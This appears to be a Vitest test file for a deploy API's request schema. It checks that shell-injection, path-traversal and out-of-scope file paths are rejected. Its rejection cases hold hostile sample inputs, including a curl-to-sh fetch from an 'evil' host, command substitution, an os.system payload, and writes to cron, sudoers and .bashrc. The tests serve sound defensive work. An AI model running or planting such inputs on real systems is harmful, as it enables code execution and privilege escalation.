/**
 * The `POST /api/services` boundary schema + extraFiles scope check (#2503).
 *
 * The route test proves the HTTP behaviour; this pins the rules themselves so
 * a future edit to the schema has to break a named expectation.
 */
import { describe, it, expect } from 'vitest';
import {
  CreateServiceRequest,
  collectAllowedExtraFileRoots,
  findOutOfScopeExtraFiles,
  isWithinRoots,
} from './deployRequest';

const POD_YAML = `apiVersion: v1
kind: Pod
metadata:
  name: demo
spec:
  containers:
  - name: demo
    image: docker.io/library/nginx:alpine
  volumes:
  - name: config
    hostPath:
      path: /mnt/data/stacks/demo/config
  - name: media
    hostPath:
      path: /srv/media/
`;

const base = {
  name: 'demo',
  kubeContent: '[Kube]\nYaml=demo.yml\n',
  yamlContent: POD_YAML,
  yamlFileName: 'demo.yml',
};

describe('CreateServiceRequest — identifiers that reach a shell', () => {
  it('accepts a plain template deploy', () => {
    expect(CreateServiceRequest.safeParse(base).success).toBe(true);
  });

  it.each([
    ['shell metacharacters', 'demo; curl http://evil/x | sh'],
    ['command substitution', 'demo$(id)'],
    ['a path separator', 'demo/../../etc/passwd'],
    ['a newline', 'demo\nevil'],
    ['whitespace', 'demo evil'],
  ])('rejects a service name with %s', (_label, name) => {
    expect(CreateServiceRequest.safeParse({ ...base, name }).success).toBe(false);
  });

  it.each([
    ['a path separator', 'sub/demo.yml'],
    ['traversal', '../../.bashrc'],
    ['a leading dot', '.bashrc'],
    ['a backtick', 'demo`id`.yml'],
  ])('rejects a yamlFileName with %s', (_label, yamlFileName) => {
    expect(CreateServiceRequest.safeParse({ ...base, yamlFileName }).success).toBe(false);
  });
});

describe('CreateServiceRequest — no executable content from the caller', () => {
  it('rejects an inline postDeployScript outright (strict object)', () => {
    const res = CreateServiceRequest.safeParse({
      ...base,
      postDeployScript: 'import os; os.system("id")',
    });
    expect(res.success).toBe(false);
  });

  it('rejects an inline migration body', () => {
    const res = CreateServiceRequest.safeParse({
      ...base,
      migrations: [{ filename: 'v1-to-v2.py', fromVersion: 1, toVersion: 2, content: 'x' }],
    });
    expect(res.success).toBe(false);
  });

  it('accepts a migration reference without a body', () => {
    const res = CreateServiceRequest.safeParse({
      ...base,
      migrations: [{ filename: 'v1-to-v2.py', fromVersion: 1, toVersion: 2 }],
    });
    expect(res.success).toBe(true);
  });

  it('rejects a migration filename outside the vN-to-vM.py convention', () => {
    for (const filename of ['../../../etc/x.py', 'post-deploy.py', 'v1-to-v2.py.sh']) {
      const res = CreateServiceRequest.safeParse({
        ...base,
        migrations: [{ filename, fromVersion: 1, toVersion: 2 }],
      });
      expect(res.success, filename).toBe(false);
    }
  });

  it.each([
    ['an assignment escape', "X='' ; id ; A"],
    ['a newline', 'A\nB'],
    ['a dash', 'MY-VAR'],
    ['a leading digit', '1VAR'],
  ])('rejects a postDeployEnv key with %s', (_label, key) => {
    const res = CreateServiceRequest.safeParse({ ...base, postDeployEnv: { [key]: 'v' } });
    expect(res.success).toBe(false);
  });

  it('accepts ordinary wizard variable names', () => {
    const res = CreateServiceRequest.safeParse({
      ...base,
      postDeployEnv: { DEMO_ADMIN_EMAIL: 'a@b.c', HOST: 'demo.example', LAN_IP: '10.0.0.2' },
    });
    expect(res.success).toBe(true);
  });
});

describe('CreateServiceRequest — extraFiles paths', () => {
  it.each([
    ['a relative path', 'config/settings.yml'],
    ['traversal', '/mnt/data/stacks/demo/../../../etc/passwd'],
    ['command substitution', '/mnt/data/stacks/demo/$(id)/f.yml'],
    ['a semicolon', '/mnt/data/stacks/demo;id/f.yml'],
    ['a space', '/mnt/data/stacks/demo /f.yml'],
    ['a trailing slash', '/mnt/data/stacks/demo/'],
  ])('rejects %s', (_label, path) => {
    const res = CreateServiceRequest.safeParse({ ...base, extraFiles: [{ path, content: 'x' }] });
    expect(res.success).toBe(false);
  });

  it('accepts an ordinary absolute config path', () => {
    const res = CreateServiceRequest.safeParse({
      ...base,
      extraFiles: [{ path: '/mnt/data/stacks/demo/config/configuration.yml', content: 'a: 1' }],
    });
    expect(res.success).toBe(true);
  });
});

describe('extraFiles scope — the service may only write into its own storage', () => {
  const roots = collectAllowedExtraFileRoots(POD_YAML, '/mnt/data/stacks', 'demo');

  it('collects every hostPath the manifest declares plus the service data dir', () => {
    expect(roots.sort()).toEqual(['/mnt/data/stacks/demo', '/mnt/data/stacks/demo/config', '/srv/media']);
  });

  it('survives an unparseable manifest with the service data dir alone', () => {
    expect(collectAllowedExtraFileRoots('%%not: [yaml', '/mnt/data/stacks', 'demo'))
      .toEqual(['/mnt/data/stacks/demo']);
  });

  it('accepts files under a declared hostPath or the service data dir', () => {
    expect(findOutOfScopeExtraFiles([
      '/mnt/data/stacks/demo/config/configuration.yml',
      '/srv/media/.config',
      '/mnt/data/stacks/demo/skills/audit/SKILL.md',
    ], roots)).toEqual([]);
  });

  it('refuses a write into a SIBLING service data dir', () => {
    expect(findOutOfScopeExtraFiles(['/mnt/data/stacks/auth/authelia-config/configuration.yml'], roots))
      .toEqual(['/mnt/data/stacks/auth/authelia-config/configuration.yml']);
  });

  it('refuses a well-formed path outside every root', () => {
    expect(findOutOfScopeExtraFiles([
      '/etc/cron.d/pwn',
      '/home/core/.bashrc',
      '/etc/sudoers.d/pwn',
    ], roots)).toEqual(['/etc/cron.d/pwn', '/home/core/.bashrc', '/etc/sudoers.d/pwn']);
  });

  it('does not treat a sibling prefix as containment', () => {
    expect(isWithinRoots('/srv/media-evil/f', ['/srv/media'])).toBe(false);
    expect(isWithinRoots('/srv/media/f', ['/srv/media'])).toBe(true);
    expect(isWithinRoots('/srv/media', ['/srv/media'])).toBe(true);
  });

  it('has no roots at all when the manifest declares none and the data dir is blank', () => {
    const none = collectAllowedExtraFileRoots('apiVersion: v1\nkind: Pod\n', '', 'demo');
    expect(none).toEqual([]);
    expect(findOutOfScopeExtraFiles(['/anything'], none)).toEqual(['/anything']);
  });
});
